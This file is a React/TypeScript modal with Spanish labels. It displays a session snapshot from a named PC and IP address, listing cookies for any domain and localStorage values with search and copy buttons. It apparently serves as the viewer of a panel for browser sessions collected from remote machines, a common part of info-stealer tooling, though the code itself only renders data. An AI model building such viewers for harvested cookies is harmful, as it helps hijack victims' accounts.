import React from 'react';
import { X, Search, Copy, Check, ExternalLink } from 'lucide-react';
import { SessionSnapshot, Cookie } from '@/lib/supabase';

interface SessionModalProps {
  session: SessionSnapshot;
  cookies: Cookie[];
  webStorage: any[];
  onClose: () => void;
}

export function SessionModal({ session, cookies, webStorage, onClose }: SessionModalProps) {
  const [copied, setCopied] = React.useState<string | null>(null);
  const [search, setSearch] = React.useState('');
  const [activeTab, setActiveTab] = React.useState<'cookies' | 'storage'>('cookies');

  const handleCopy = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopied(id);
    setTimeout(() => setCopied(null), 2000);
  };

  const filteredCookies = cookies.filter(c => 
    c.domain.toLowerCase().includes(search.toLowerCase()) || 
    c.name.toLowerCase().includes(search.toLowerCase())
  );

  return (
    <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
      <div className="bg-[#0B0E14] border border-gray-800 rounded-xl w-full max-w-5xl max-h-[90vh] flex flex-col shadow-2xl overflow-hidden">
        {/* Header */}
        <div className="flex justify-between items-center p-6 border-b border-gray-800">
          <div>
            <h2 className="text-xl font-bold text-gray-100">Datos de Sesión</h2>
            <p className="text-sm text-gray-400 mt-1">{session.pc_name} ({session.ip_address})</p>
          </div>
          <button onClick={onClose} className="text-gray-400 hover:text-white p-2 hover:bg-gray-800 rounded-lg transition-colors">
            <X className="w-6 h-6" />
          </button>
        </div>

        {/* Toolbar */}
        <div className="p-4 border-b border-gray-800 bg-[#12161F] flex flex-wrap gap-4 items-center justify-between">
          <div className="flex gap-2">
            <button 
              onClick={() => setActiveTab('cookies')} 
              className={`px-4 py-2 rounded-lg text-sm font-medium transition-colors ${activeTab === 'cookies' ? 'bg-indigo-600 text-white' : 'bg-gray-800 text-gray-400 hover:bg-gray-700 hover:text-gray-200'}`}
            >
              Cookies ({cookies.length})
            </button>
            <button 
              onClick={() => setActiveTab('storage')} 
              className={`px-4 py-2 rounded-lg text-sm font-medium transition-colors ${activeTab === 'storage' ? 'bg-indigo-600 text-white' : 'bg-gray-800 text-gray-400 hover:bg-gray-700 hover:text-gray-200'}`}
            >
              Local Storage ({webStorage.length})
            </button>
          </div>
          <div className="relative w-full sm:w-64">
            <Search className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-gray-500" />
            <input 
              type="text"
              placeholder="Buscar dominio o nombre..."
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              className="w-full bg-[#080B10] border border-gray-700 rounded-lg pl-9 pr-4 py-2 text-sm text-gray-200 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500"
            />
          </div>
        </div>

        {/* Content Area */}
        <div className="flex-1 overflow-auto p-6 bg-[#080B10]">
          {activeTab === 'cookies' ? (
            <div className="space-y-4">
              {filteredCookies.length === 0 ? (
                <div className="text-center py-12 text-gray-500">No se encontraron cookies.</div>
              ) : (
                filteredCookies.map(cookie => (
                  <div key={cookie.id} className="bg-[#12161F] border border-gray-800 rounded-lg p-4 hover:border-gray-700 transition-colors">
                    <div className="flex justify-between items-start mb-2">
                      <div className="flex items-center gap-2">
                        <span className="text-indigo-400 font-mono text-sm">{cookie.domain}</span>
                        <span className="text-gray-500 text-sm">/</span>
                        <span className="text-gray-200 font-medium">{cookie.name}</span>
                      </div>
                      <button 
                        onClick={() => handleCopy(cookie.value, cookie.id)}
                        className="text-gray-400 hover:text-white p-1 hover:bg-gray-800 rounded transition-colors flex items-center gap-1 text-xs"
                      >
                        {copied === cookie.id ? <Check className="w-3 h-3 text-green-400" /> : <Copy className="w-3 h-3" />}
                        {copied === cookie.id ? 'Copiado' : 'Copiar'}
                      </button>
                    </div>
                    <div className="bg-black/50 p-3 rounded border border-gray-800 font-mono text-xs text-gray-400 break-all overflow-x-auto">
                      {cookie.value}
                    </div>
                  </div>
                ))
              )}
            </div>
          ) : (
            <div className="space-y-4">
               {webStorage.length === 0 ? (
                <div className="text-center py-12 text-gray-500">No hay datos de LocalStorage.</div>
              ) : (
                webStorage.map((item, idx) => (
                  <div key={idx} className="bg-[#12161F] border border-gray-800 rounded-lg p-4 hover:border-gray-700 transition-colors">
                    <div className="flex justify-between items-start mb-2">
                      <div className="flex items-center gap-2">
                        <span className="text-purple-400 font-mono text-sm">{item.domain || 'N/A'}</span>
                        <span className="text-gray-500 text-sm">/</span>
                        <span className="text-gray-200 font-medium">{item.key}</span>
                      </div>
                      <button 
                        onClick={() => handleCopy(item.value, `ws-${idx}`)}
                        className="text-gray-400 hover:text-white p-1 hover:bg-gray-800 rounded transition-colors flex items-center gap-1 text-xs"
                      >
                        {copied === `ws-${idx}` ? <Check className="w-3 h-3 text-green-400" /> : <Copy className="w-3 h-3" />}
                        {copied === `ws-${idx}` ? 'Copiado' : 'Copiar'}
                      </button>
                    </div>
                    <div className="bg-black/50 p-3 rounded border border-gray-800 font-mono text-xs text-gray-400 break-all overflow-x-auto">
                      {item.value}
                    </div>
                  </div>
                ))
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
